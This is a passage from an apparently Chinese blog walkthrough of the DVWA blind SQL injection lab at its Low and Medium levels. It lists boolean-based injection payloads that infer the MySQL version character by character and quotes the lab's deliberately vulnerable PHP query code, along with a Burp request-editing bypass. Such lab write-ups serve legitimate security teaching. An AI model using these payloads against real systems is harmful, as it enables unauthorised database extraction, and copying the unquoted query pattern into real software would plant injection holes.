TdgCA44TwBQADCF8AMIDwBQADCF8AMIDwBQADCF8AMIDwBQADCF8AMIDwBQADCF8AMIDwBQADCF8AMIDwBQADCF8AMIDwBQADCF8AMIDwBQADCF8AMIDwBQADCF8AMOD/4R5HxKsE18cAAAAASUVORK5CYII=" alt="image-20220823162457035"></p><p>尝试输入 <code>1&#39; and 1=2 # </code>，查询失败</p><p><img src="data:image/png;base64,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" alt="image-20220823162539643"></p><p>可见其只有两种返回，并且因为需要用单引号闭合，存在字符型注入漏洞。</p><h4 id="猜测版本号" tabindex="-1"><a class="header-anchor" href="#猜测版本号"><span>猜测版本号</span></a></h4><p>查询MySQL版本语句为</p><div class="language-mysql line-numbers-mode" data-highlighter="prismjs" data-ext="mysql" data-title="mysql"><pre><code><span class="line">select version();</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>首先测试版本号的长度</p><p>​ <code>length()</code> 函数获取字符串长度</p><p>​ <code>substr( string, start, length)</code> 函数截取字符串</p><p>​ 用 <code>substr()</code> 函数提取返回的版本号字符串，使用 <code>length()</code> 函数和我们的猜测值比较是否相等</p><div class="language-mysql line-numbers-mode" data-highlighter="prismjs" data-ext="mysql" data-title="mysql"><pre><code><span class="line"># 分别测试以下语句</span>
<span class="line">1&#39; and length(substr((select version()),1)) = 1 #</span>
<span class="line">1&#39; and length(substr((select version()),1)) = 2 #</span>
<span class="line">1&#39; and length(substr((select version()),1)) = 3 #</span>
<span class="line">1&#39; and length(substr((select version()),1)) = 4 #</span>
<span class="line">1&#39; and length(substr((select version()),1)) = 5 #</span>
<span class="line">1&#39; and length(substr((select version()),1)) = 6 #</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>直到 <code>1&#39; and length(substr((select version()),1)) = 6 #</code>，返回查询成功，则说明版本号为六位</p><p><img src="/blog/assets/image-20220823164305127-OkDD5ozq.png" alt="image-20220823164305127"></p><p>然后测试出版本号</p><p>周所周知，一般版本号都是 x.x.x.x 之类的组成 ( &#39;x&#39; 代表数字)，而 MySQL 一般为 x.x.xx</p><p>进行逐个尝试或猜测</p><div class="language-mysql line-numbers-mode" data-highlighter="prismjs" data-ext="mysql" data-title="mysql"><pre><code><span class="line">1&#39; and substr((select version()),1,1) = &#39;5&#39; #</span>
<span class="line">1&#39; and substr((select version()),2,1) = &#39;.&#39; #</span>
<span class="line">1&#39; and substr((select version()),3,1) = &#39;5&#39; #</span>
<span class="line">1&#39; and substr((select version()),4,1) = &#39;.&#39; #</span>
<span class="line">1&#39; and substr((select version()),5,1) = &#39;3&#39; #</span>
<span class="line">1&#39; and substr((select version()),6,1) = &#39;3&#39; #</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="data:image/png;base64,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" alt="image-20220823164749777"></p><p>最后拼接得到 MySQL 版本为 5.5.33</p><h2 id="medium-1" tabindex="-1"><a class="header-anchor" href="#medium-1"><span>Medium</span></a></h2><h3 id="源代码-4" tabindex="-1"><a class="header-anchor" href="#源代码-4"><span>源代码</span></a></h3><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;Submit&#39;</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token comment">// Get input</span></span>
<span class="line">    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;id&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;SQLI_DB&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">case</span> <span class="token constant">MYSQL</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$id</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">&quot;&quot;</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">            <span class="token comment">// Check database</span></span>
<span class="line">            <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="token interpolation"><span class="token variable">$id</span></span>;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Removed &#39;or die&#39; to suppress mysql errors</span></span>
<span class="line"></span>
<span class="line">            <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token keyword">try</span> <span class="token punctuation">{</span></span>
<span class="line">                    <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// The &#39;@&#39; character suppresses errors</span></span>
<span class="line">                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                    <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token punctuation">}</span></span>
<span class="line">            <span class="token punctuation">}</span></span>
<span class="line">            </span>
<span class="line">            <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token keyword">case</span> <span class="token constant">SQLITE</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">global</span> <span class="token variable">$sqlite_db_connection</span><span class="token punctuation">;</span></span>
<span class="line">            </span>
<span class="line">            <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="token interpolation"><span class="token variable">$id</span></span>;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">try</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token variable">$results</span> <span class="token operator">=</span> <span class="token variable">$sqlite_db_connection</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$results</span><span class="token operator">-&gt;</span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token variable">$row</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token punctuation">}</span></span>
<span class="line">            <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$exists</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token delimiter important">?&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="代码分析-4" tabindex="-1"><a class="header-anchor" href="#代码分析-4"><span>代码分析</span></a></h3><p>使用了 mysql_real_escape_string() 函数转义字符串中的特殊字符。特殊符号 \x00、\n、\r、\、&#39;、&quot; 和 \x1a 都将进行转义。</p><p>同时前端页面的输入框删了，改成了下拉选择表单，希望以此来控制用户的输入。</p><h3 id="漏洞利用-2" tabindex="-1"><a class="header-anchor" href="#漏洞利用-2"><span>漏洞利用</span></a></h3><p>用 BP 改包即可</p><blockquote><p>注：如使用特殊字符，会被过滤，需换成 ASCII 码值</p></blockquote><p>如：测试 MySQL 版本号 第一位是否为 5</p><div class="language-mysql line-numbers-mode" data-highlighter="prismjs" data-ext="mysql" data-title="mysql"><pre><code><span class="line">1 and ascii(substr((select version()),1,1)) = 53 #</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="/blog/assets/image-20220823171706120-DpUOgwTb.png" alt="image-20220823171706120"></p><p>返回：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUcAAABICAYAAABlaDcKAAAGAklEQVR4nO3dT2gUZxzG8cdS4iWXIESQsm57CbTIirinQiGHerBsDDUn++eUHGIhCtEINidZe6gRtNDTBoTQXtRAra2HWBAKpejS3CzsKWC1olDmkoPm8vaQXTO7/ObP7mR3ZpPvBwbcmXfe9zczu09m34lE6+vrrrFIcq82Nnq0PHc3pwuuMH3LPfOvf3TFFQoF9+2jrXXPlk+7QuGKq/raVRea960uFJrbPL3lppv62Rxvevl5ZG3VhYIrLPzVUtNpd/NpS9v6GHH69C9zc3Muln9+dJ9KrvxnvOZ+a2trLp/PO0lOksvn87H2m5ubM+v1PC/GUnOVcTldXLG335930rxbCWxbXzdecTXPc5634uYlV1qsNfVTWyz5+rHabK6bv+8b+3HFlfzrmmppvC65yuM4x7m5WOeKZecsbys1+zR2vap3vyvqeLHsW/+hvv61qrFhX8vSNd3TWR0vFn3tPtdi9YT21V8dmqlqUUVNFn940+KzSlUzh7er3j90+ZOiLrestcb47+5ZHf9tVPeub9XXa/l8Xg8ePNDo6KgkaW1trQejDmviq3lNfXxMX75X09JJ30XUS93+vqzSYk3FetuD70v65ndVzxdVlPRy+ZymfpI03tzr3ckRXT3oafaopH9v69zkXZUWF1QU0D0phuOmQzNVPZyJbrevdE0PS0n62gzjsbg1+VccPqOH1TMx9qyPFKPWXmgEZD6f792gR2fleR/p6tCIhib9G0qqPPa0dGBrTfF8TZW/R3RsqP7D8eKKaovSyC/NXc7fX5E+HtLQm9f1oNzWur9QZbysqQ+GNHVxRd55one3Sz0c0V09DcY3ipr1PM1GthvWxA1PEzf865bknWzuR5IU2J+vTdi6AxNa8ia2Xh+dVXMTqxbsZoRjlr1zSsvuVNpVALvSW2kXAABZRDgCgIFwBAADc44puFQu68KFC2mXYbpULkc3AnYBwjEl/RRCuVxOq6urOnLkSNqlZMbq6qpyuVzaZaCL9tT/Z4wkaXBwUK82NtKsBxn08sUL/Xznjp48eZJ2KZmRy+U0duKEhvfvT7sUdAnhCAAGHsgAgIFwBAAD4QgABsIRAAyEIwAYCEcAMBCOAGAgHAHAQDgCgIFwBAAD4QgABsIRAAyEIwAYCEcAMBCOAGAgHAHAQDgCgIFwBAAD4QgAhlT++uDegYE3/35d/5s11ro0+etpsGpt3dZLjTqycL4sWa8PCJPKnWPjw+L/0Fjr0vR6Y6OppqBaG4sVmEjH3oGBnl+PXo6ZxvHtRnyt3iZpBGRraHeimzVvR31RsnIX3+mYnZz/rNxA7HSEIwAYUplzjCvqrqB1e9D8ZdbmMxuC6m/d5j+GduZo486bBs0NJrkrC6vPP16n1yZO/XHr6GR8a/9Ox45z/qOucbvH3rrdapf0/PS7zIbj3oGByDeUtd3/Va4xNxP2ICUtYfVLW8FhzXX6/x10TFHnz79/0AcnTlgGiXp41XptwmqJ6j8sOIL6jzr/Udp9fwZdy7jnP6reqPZx+4s73m7QV1+rO7kwQeHSD4JCJEl/ae7f7f563X/csZPOKwbt3/reDrpTjDt+v30+ui2zd47WA44kdzJZ1O2HIUm+FiXdvx90+/0TNH2Qhf13w+crqcyGo2RfrH6+E2zV6zundu9Ad/rXqm4eS9Jz1Yv9d/rnK6nMfq1O8pMyDdsRHK31++dQ2z22pOevH+8aktacZP+wfeP2GzZ/HLU+au6105rCxuvH90g79qyvr7vGi8HBQb3q4U+LuE9rre1h+2/H777FfdLbaf9WP9bxB80ltfukMaxG64ln0mOMe/7aefo